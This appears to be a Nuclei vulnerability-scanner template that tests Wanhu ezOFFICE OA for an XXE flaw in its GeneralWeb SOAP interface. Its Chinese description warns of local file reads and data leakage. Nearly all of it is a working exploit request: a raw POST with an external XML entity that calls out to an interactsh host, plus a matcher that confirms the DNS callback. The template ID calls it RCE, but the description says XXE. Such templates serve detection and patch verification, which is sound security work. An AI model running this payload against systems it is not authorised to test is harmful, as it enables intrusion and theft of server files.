pocs/nuclei/wanhu-ezOFFICE-GeneralWeb-rce.yaml

id: wanhu-ezOFFICE-GeneralWeb-rce

info:
  name: 万户OA系统接口GeneralWeb存在XXE漏洞
  author: wangzong
  severity: high
  description: 万户OA系统接口GeneralWeb存在XXE漏洞，允许攻击者利用XML解析器处理外部实体，从而访问本地文件或进行其他恶意操作，可能导致敏感信息泄露和系统被攻击。
  reference:
    - https://forum.butian.net/share/3784
  tags: tags

http:
  - raw:
      - |-
        POST /defaultroot/xfservices/./GeneralWeb HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Moziilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
        Content-Type: text/xml;charset=UTF-8
        SOAPAction: 1
        Content-Length: 457

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                          xmlns:gen="http://com.whir.service/GeneralWeb">
            <soapenv:Body>
                <gen:OAManager>
                    <gen:input>
                        <![CDATA[
                        <?xml version="1.0" encoding="UTF-8"?>
                        <!DOCTYPE root [
                        <!ENTITY x SYSTEM "http://{{interactsh-url}}">
                        ]>
                        <root>&x;</root>
                        ]]>
                    </gen:input>
                </gen:OAManager>
            </soapenv:Body>
        </soapenv:Envelope>
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"